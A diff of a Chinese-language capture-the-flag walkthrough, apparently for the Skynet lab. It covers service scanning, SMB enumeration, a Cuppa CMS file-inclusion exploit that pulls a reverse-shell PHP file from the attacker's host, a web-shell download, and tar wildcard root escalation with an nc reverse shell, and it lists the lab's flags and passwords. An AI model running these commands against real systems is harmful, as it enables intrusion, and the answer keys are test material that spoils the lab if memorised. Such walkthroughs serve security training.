@@ -1,6 +1,7 @@
 #服务扫描
+```
 ┌──(root💀kali)-[~]
-└─# nmap -sV 10.10.111.23                                                                                                                                                                                   255 ⨯
+└─# nmap -sV 10.10.166.193                                                                                                                                                                                   255 ⨯
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-31 05:18 EDT
 Nmap scan report for 10.10.111.23
 Host is up (0.32s latency).
@@ -16,11 +17,12 @@ Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 22.67 seconds
-
+```
 
 
 #目录爆破
-└─# python3 dirsearch.py -u http://10.10.111.23 -e * -t 50 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt
+```
+└─# python3 dirsearch.py -u http://10.10.166.193 -e * -t 50 -w /usr/share/wordlists/Web-Content/directory-list-2.3-medium.txt
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -29,7 +31,7 @@ Extensions: CHANGELOG.md | HTTP method: get | Threads: 50 | Wordlist size: 22052
 
 Error Log: /root/dirsearch/logs/errors-21-08-31_05-34-51.log
 
-Target: http://10.10.111.23
+Target: http://10.10.166.193
 
 [05:34:52] Starting: 
 [05:34:58] 301 -  312B  - /admin  ->  http://10.10.111.23/admin/
@@ -39,7 +41,7 @@ Target: http://10.10.111.23
 [05:35:06] 301 -  313B  - /config  ->  http://10.10.111.23/config/
 [05:35:19] 301 -  309B  - /ai  ->  http://10.10.111.23/ai/
 [05:37:06] 301 -  319B  - /squirrelmail  ->  http://10.10.111.23/squirrelmail/
-
+```
 
 
 
@@ -47,14 +49,15 @@ Target: http://10.10.111.23
 ###枚举samba服务
 
 #枚举用户，可以用空会话登录
+```
 ┌──(root💀kali)-[~]
-└─# enum4linux -U 10.10.71.172                                                                                                                                                                                                        255 ⨯
+└─# enum4linux -U 10.10.166.193                                                                                                                                                                                                        255 ⨯
 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Sep  1 02:38:03 2021
 
  ========================== 
 |    Target Information    |
  ========================== 
-Target ........... 10.10.71.172
+Target ........... 10.10.166.193
 RID Range ........ 500-550,1000-1050
 Username ......... ''
 Password ......... ''
@@ -62,41 +65,42 @@ Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 
 
  ==================================================== 
-|    Enumerating Workgroup/Domain on 10.10.71.172    |
+|    Enumerating Workgroup/Domain on 10.10.166.193    |
  ==================================================== 
 [+] Got domain/workgroup name: WORKGROUP
 
  ===================================== 
-|    Session Check on 10.10.71.172    |
+|    Session Check on 10.10.166.193    |
  ===================================== 
-[+] Server 10.10.71.172 allows sessions using username '', password ''
+[+] Server 10.10.166.193 allows sessions using username '', password ''
 
  =========================================== 
-|    Getting domain SID for 10.10.71.172    |
+|    Getting domain SID for 10.10.166.193    |
  =========================================== 
 Domain Name: WORKGROUP
 Domain Sid: (NULL SID)
 [+] Can't determine if host is part of domain or part of a workgroup
 
  ============================= 
-|    Users on 10.10.71.172    |
+|    Users on 10.10.166.193    |
  ============================= 
 index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: milesdyson       Name:   Desc: 
 
 user:[milesdyson] rid:[0x3e8]
 enum4linux complete on Wed Sep  1 02:38:20 2021
-
+```
 
 
 #枚举分享目录
+```
 ┌──(root💀kali)-[~]
-└─# enum4linux -S 10.10.71.172
+└─# enum4linux -S 10.10.166.193
 Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed Sep  1 02:41:21 2021
 
  ========================== 
 |    Target Information    |
  ========================== 
-Target ........... 10.10.71.172
+Target ........... 10.10.166.193
 RID Range ........ 500-550,1000-1050
 Username ......... ''
 Password ......... ''
@@ -104,24 +108,24 @@ Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none
 
 
  ==================================================== 
-|    Enumerating Workgroup/Domain on 10.10.71.172    |
+|    Enumerating Workgroup/Domain on 10.10.166.193    |
  ==================================================== 
 [+] Got domain/workgroup name: WORKGROUP
 
  ===================================== 
-|    Session Check on 10.10.71.172    |
+|    Session Check on 10.10.166.193    |
  ===================================== 
-[+] Server 10.10.71.172 allows sessions using username '', password ''
+[+] Server 10.10.166.193 allows sessions using username '', password ''
 
  =========================================== 
-|    Getting domain SID for 10.10.71.172    |
+|    Getting domain SID for 10.10.166.193    |
  =========================================== 
 Domain Name: WORKGROUP
 Domain Sid: (NULL SID)
 [+] Can't determine if host is part of domain or part of a workgroup
 
  ========================================= 
-|    Share Enumeration on 10.10.71.172    |
+|    Share Enumeration on 10.10.166.193    |
  ========================================= 
 
         Sharename       Type      Comment
@@ -132,21 +136,27 @@ Domain Sid: (NULL SID)
         IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
 SMB1 disabled -- no workgroup available
 
-[+] Attempting to map shares on 10.10.71.172
-//10.10.71.172/print$   Mapping: DENIED, Listing: N/A
-//10.10.71.172/anonymous        Mapping: OK, Listing: OK
-//10.10.71.172/milesdyson       Mapping: DENIED, Listing: N/A
-//10.10.71.172/IPC$     [E] Can't understand response:
+[+] Attempting to map shares on 10.10.166.193
+//10.10.166.193/print$   Mapping: DENIED, Listing: N/A
+//10.10.166.193/anonymous        Mapping: OK, Listing: OK
+//10.10.166.193/milesdyson       Mapping: DENIED, Listing: N/A
+//10.10.166.193/IPC$     [E] Can't understand response:
 NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
 enum4linux complete on Wed Sep  1 02:41:44 2021
-
+```
 
 #连接smb
-smbclient  //10.10.71.172/anonymous
+smbclient  //10.10.166.193/anonymous
 
 在logs/log1.txt里找到密码：cyborg007haloterminator
 
-#登录 http://10.10.71.172/squirrelmail/
+```
+question:What is Miles password for his emails?
+
+answer:cyborg007haloterminator
+```
+
+#登录 http://10.10.166.193/squirrelmail/
 
 账号密码：milesdyson：cyborg007haloterminator
 
@@ -194,7 +204,7 @@ balls have zero to me to me to me to me to me to me to me to me to
 
 
 #登录mailesdyson的samba
-smbclient  //10.10.71.172/milesdyson -U milesdyson 
+smbclient  //10.10.166.193/milesdyson -U milesdyson 
 密码：)s{A&2Z=F^n_E.B`
 
 #在notes/important.txt里得到信息
@@ -209,9 +219,23 @@ smbclient  //10.10.71.172/milesdyson -U milesdyson
 #隐藏目录名
 /45kra24zxs28v3yd
 
+```
+question：What is the hidden directory?
+answer：/45kra24zxs28v3yd
+
+```
+
+
+```
+question：What is the vulnerability called when you can include a remote file for malicious purposes?
+answer：/remote file inclusion 
+```
+
+
 #爆破隐藏目录
+```
 ┌──(root💀kali)-[~/dirsearch]
-└─# python3 dirsearch.py -u "http://10.10.71.172/45kra24zxs28v3yd/" -e* -t 50   
+└─# python3 dirsearch.py -u "http://10.10.166.193/45kra24zxs28v3yd/" -e* -t 50   
 
  _|. _ _  _  _  _ _|_    v0.3.8
 (_||| _) (/_(_|| (_| )
@@ -220,19 +244,19 @@ Extensions: * | HTTP method: get | Threads: 50 | Wordlist size: 6100
 
 Error Log: /root/dirsearch/logs/errors-21-09-01_04-50-59.log
 
-Target: http://10.10.71.172/45kra24zxs28v3yd/
+Target: http://10.10.166.193/45kra24zxs28v3yd/
 
 [04:50:59] Starting: 
-[04:51:14] 301 -  337B  - /45kra24zxs28v3yd/administrator  ->  http://10.10.71.172/45kra24zxs28v3yd/administrator/
+[04:51:14] 301 -  337B  - /45kra24zxs28v3yd/administrator  ->  http://10.10.166.193/45kra24zxs28v3yd/administrator/
 [04:51:14] 403 -  277B  - /45kra24zxs28v3yd/administrator/.htaccess
 [04:51:15] 200 -    5KB - /45kra24zxs28v3yd/administrator/
 [04:51:15] 200 -    5KB - /45kra24zxs28v3yd/administrator/index.php
 [04:51:26] 200 -  418B  - /45kra24zxs28v3yd/index.html                                                            
                                                                                                                   
 Task Completed
+```
 
-
-得到登录页面：http://10.10.71.172/45kra24zxs28v3yd/index.php
+得到登录页面：http://10.10.166.193/45kra24zxs28v3yd/index.php
 
 
 #cms名称
@@ -243,7 +267,7 @@ Cuppa CMS
 https://www.exploit-db.com/exploits/25971
 
 验证LFI：
-http://10.10.71.172/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
+http://10.10.166.193/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
 
 可以读取本机信息：
 ```
@@ -256,12 +280,81 @@ root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin 
 准备好反弹shell文件，本地开启一个http服务
 python3 -m http.server
 
-http://10.10.106.99/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.21.169:8000/revse_shell.php
+http://10.10.166.193/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.21.169:8000/revse_shell.php
 
-拿到初始shell，转成稳定shell，用命令行下载一句话木马
+#拿到初始shell
+在/home/milesdyson找到user.txt
+
+```
+question：What is the user flag?
+answer：7ce5c2109a40f958099283600a9ae807
+```
+
+
+
+#转成稳定shell，用命令行下载一句话木马
 wget http://10.13.21.169:8000/shell.php1
 
 
-#定时任务
+#一句话木马访问地址，用菜刀连接
+http://10.10.166.193/45kra24zxs28v3yd/administrator/alerts/shell.php
 
-*/1 *e--* * *   root    /home/milesdyson/backups/backup.sh
+#可以su milesdyson（需要先转成tty）,密码是：cyborg007haloterminator，但是不可以用ssh直连
+
+#查看定时任务
+```
+$ cat /etc/crontab
+cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+```
+
+
+#查看定时任务脚本
+```
+$ cat /home/milesdyson/backups/backup.sh
+cat /home/milesdyson/backups/backup.sh
+#!/bin/bash
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *
+```
+
+
+#通配符提权，在/var/www/html/分别写入三个文件
+因为靶机的nc不能使用-e，我们用另外一种方法做反弹shell
+
+mknod /tmp/backpipe p
+
+echo '/bin/sh 0</tmp/backpipe | nc 10.13.21.169 4455 1>/tmp/backpipe' > shell.sh
+
+echo "" > "--checkpoint-action=exec=sh shell.sh"
+
+echo "" > --checkpoint=1
+
+
+#通配符提权解释
+最后tar cf /home/milesdyson/backups/backup.tgz *这条命令的执行会变成：tar cf /home/milesdyson/backups/backup.tgz --checkpoint=1 --checkpoint-action=exec=sh shell.sh shell.sh 
+
+#另外开启一个监听端口
+nc -lnvp 4455
+
+#在/root/找到root.txt
+
+```
+question：What is the root flag?
+answer：3f0372db24753accc7179a282cd6a949
+
+```
